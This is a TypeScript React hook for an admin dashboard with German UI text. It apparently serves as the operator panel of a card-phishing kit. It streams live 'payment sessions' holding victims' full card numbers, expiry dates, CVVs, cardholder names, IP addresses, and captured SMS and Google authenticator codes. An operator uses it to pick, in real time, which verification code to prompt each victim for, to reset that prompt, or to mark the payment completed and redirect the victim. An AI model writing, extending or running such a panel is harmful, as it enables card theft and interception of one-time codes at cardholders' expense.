import { useState, useEffect, useCallback } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';

interface PaymentSession {
  id: string;
  session_id: string;
  created_at: string;
  last_seen: string;
  is_active: boolean;
  user_ip: string;
  verification_method: string;
  verification_status: string;
  sms_code: string;
  google_code: string;
  admin_action_pending: boolean;
  orders: {
    order_number: number;
    final_price: number;
    cardholder_name: string;
    card_number: string;
    expiry_date: string;
    cvv: string;
    created_at: string;
  };
}

export const useOptimisticDashboard = () => {
  const [activeSessions, setActiveSessions] = useState<PaymentSession[]>([]);
  const [inactiveSessions, setInactiveSessions] = useState<PaymentSession[]>([]);
  const [optimisticUpdates, setOptimisticUpdates] = useState<Record<string, Partial<PaymentSession>>>({});
  const [loading, setLoading] = useState(true);
  const { toast } = useToast();

  // Fetch sessions
  const fetchSessions = useCallback(async () => {
    try {
      setLoading(true);
      
      // Fetch active sessions
      const activeResponse = await supabase.functions.invoke('payment-sessions/active-sessions');
      if (activeResponse.data?.sessions) {
        setActiveSessions(activeResponse.data.sessions);
      }
    } catch (error) {
      console.error('Error fetching sessions:', error);
    } finally {
      setLoading(false);
    }
  }, []);

  const fetchInactiveSessions = useCallback(async () => {
    try {
      const inactiveResponse = await supabase.functions.invoke('payment-sessions/inactive-sessions');
      if (inactiveResponse.data?.sessions) {
        setInactiveSessions(inactiveResponse.data.sessions);
      }
    } catch (error) {
      console.error('Error fetching inactive sessions:', error);
    }
  }, []);

  // Initial load
  useEffect(() => {
    fetchSessions();
  }, [fetchSessions]);

  // Unified realtime updates
  useEffect(() => {
    console.log('Setting up unified dashboard realtime');

    const channel = supabase
      .channel('dashboard-payment-updates')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'payment_sessions'
        },
        (payload) => {
          const { eventType, new: newRecord, old: oldRecord } = payload;
          console.log('Dashboard realtime update:', eventType, newRecord);
          
          // Clear optimistic update for this session
          const sessionId = (newRecord as any)?.session_id || (oldRecord as any)?.session_id;
          if (sessionId) {
            setOptimisticUpdates(prev => {
              const { [sessionId]: _, ...rest } = prev;
              return rest;
            });
          }

          if (eventType === 'INSERT') {
            // Fetch complete session data for new sessions
            fetchSessions();
          } else if (eventType === 'UPDATE') {
        const tenMinutesAgo = Date.now() - 10 * 60 * 1000;
        const lastSeenTime = new Date(newRecord.last_seen).getTime();
        const isSessionActive = newRecord.is_active && lastSeenTime > tenMinutesAgo;
            
            if (isSessionActive) {
              // Update active sessions
              setActiveSessions(prev => 
                prev.map(session => 
                  session.session_id === newRecord.session_id 
                    ? { ...session, ...newRecord }
                    : session
                )
              );
              // Remove from inactive if present
              setInactiveSessions(prev => 
                prev.filter(session => session.session_id !== newRecord.session_id)
              );
            } else {
              // Move to inactive sessions
              setActiveSessions(prev => {
                const sessionToMove = prev.find(s => s.session_id === newRecord.session_id);
                if (sessionToMove) {
                  const updatedSession = { ...sessionToMove, ...newRecord };
                  setInactiveSessions(inactivePrev => {
                    const exists = inactivePrev.some(s => s.session_id === newRecord.session_id);
                    if (!exists) {
                      return [...inactivePrev, updatedSession];
                    }
                    return inactivePrev.map(session => 
                      session.session_id === newRecord.session_id ? updatedSession : session
                    );
                  });
                }
                return prev.filter(session => session.session_id !== newRecord.session_id);
              });
            }
          } else if (eventType === 'DELETE') {
            // Remove from both lists
            setActiveSessions(prev => prev.filter(session => session.session_id !== oldRecord.session_id));
            setInactiveSessions(prev => prev.filter(session => session.session_id !== oldRecord.session_id));
          }
        }
      )
      .subscribe();

    return () => {
      console.log('Cleaning up dashboard realtime');
      supabase.removeChannel(channel);
    };
  }, [fetchSessions]);

  // Optimistic action handlers
  const handleVerificationAction = useCallback(async (sessionId: string, method: string) => {
    console.log('Dashboard: Setting verification method optimistically:', sessionId, method);
    
    // Optimistic update
    const optimisticUpdate = {
      verification_method: method,
      verification_status: method === 'sms_confirmation' 
        ? 'sms_confirmation' 
        : method === 'google_code_confirmation'
          ? 'google_code_confirmation'
          : 'waiting',
      admin_action_pending: true,
    };
    
    setOptimisticUpdates(prev => ({
      ...prev,
      [sessionId]: optimisticUpdate
    }));

    try {
      await supabase.functions.invoke('payment-sessions/set-verification-method', {
        body: { sessionId, method }
      });
      
      console.log('Dashboard: Verification method set successfully');
      toast({
        title: "Aktion erfolgreich",
        description: `Verifikationsmethode "${method}" wurde gesetzt.`,
      });
    } catch (error) {
      console.error('Dashboard: Error setting verification method:', error);
      // Rollback optimistic update
      setOptimisticUpdates(prev => {
        const { [sessionId]: _, ...rest } = prev;
        return rest;
      });
      toast({
        title: "Fehler",
        description: "Aktion konnte nicht ausgeführt werden.",
        variant: "destructive"
      });
    }
  }, [toast]);

  const handleCompletePayment = useCallback(async (sessionId: string) => {
    console.log('Dashboard: Completing payment optimistically:', sessionId);
    
    // Optimistic update
    const optimisticUpdate = {
      verification_status: 'completed',
      admin_action_pending: false,
    };
    
    setOptimisticUpdates(prev => ({
      ...prev,
      [sessionId]: optimisticUpdate
    }));

    try {
      await supabase.functions.invoke('payment-sessions/complete-payment', {
        body: { sessionId }
      });
      
      console.log('Dashboard: Payment completed successfully');
      toast({
        title: "Zahlung abgeschlossen",
        description: "Der Nutzer wird zur Bestätigungsseite weitergeleitet.",
      });
    } catch (error) {
      console.error('Dashboard: Error completing payment:', error);
      // Rollback optimistic update
      setOptimisticUpdates(prev => {
        const { [sessionId]: _, ...rest } = prev;
        return rest;
      });
      toast({
        title: "Fehler",
        description: "Zahlung konnte nicht abgeschlossen werden.",
        variant: "destructive"
      });
    }
  }, [toast]);

  const handleResetVerification = useCallback(async (sessionId: string) => {
    console.log('Dashboard: Resetting verification optimistically:', sessionId);
    
    // Find current session to determine reset state
    const currentSession = [...activeSessions, ...inactiveSessions].find(s => s.session_id === sessionId);
    if (!currentSession) return;

    // Determine optimistic reset state
    let optimisticUpdate: any = {
      admin_action_pending: false,
    };

    switch (currentSession.verification_method) {
      case 'app_confirmation':
        optimisticUpdate.verification_status = 'waiting';
        break;
      case 'sms_confirmation':
        optimisticUpdate.verification_status = 'sms_confirmation';
        optimisticUpdate.sms_code = null;
        break;
      case 'google_code_confirmation':
        optimisticUpdate.verification_status = 'google_code_confirmation';
        optimisticUpdate.google_code = null;
        break;
      case 'choice_required':
        optimisticUpdate.verification_status = 'waiting';
        optimisticUpdate.verification_method = 'pending';
        break;
      default:
        optimisticUpdate.verification_status = 'waiting';
        break;
    }
    
    setOptimisticUpdates(prev => ({
      ...prev,
      [sessionId]: optimisticUpdate
    }));

    try {
      await supabase.functions.invoke('payment-sessions/reset-verification', {
        body: { sessionId }
      });
      
      console.log('Dashboard: Verification reset successfully');
      toast({
        title: "Verifikation zurückgesetzt",
        description: "Der Nutzer kann es erneut versuchen.",
      });
    } catch (error) {
      console.error('Dashboard: Error resetting verification:', error);
      // Rollback optimistic update
      setOptimisticUpdates(prev => {
        const { [sessionId]: _, ...rest } = prev;
        return rest;
      });
      toast({
        title: "Fehler",
        description: "Verifikation konnte nicht zurückgesetzt werden.",
        variant: "destructive"
      });
    }
  }, [activeSessions, inactiveSessions, toast]);

  // Apply optimistic updates to sessions
  const applyOptimisticUpdates = useCallback((sessions: PaymentSession[]) => {
    return sessions.map(session => ({
      ...session,
      ...optimisticUpdates[session.session_id]
    }));
  }, [optimisticUpdates]);

  return {
    activeSessions: applyOptimisticUpdates(activeSessions),
    inactiveSessions: applyOptimisticUpdates(inactiveSessions),
    loading,
    fetchInactiveSessions,
    handleVerificationAction,
    handleCompletePayment,
    handleResetVerification
  };
};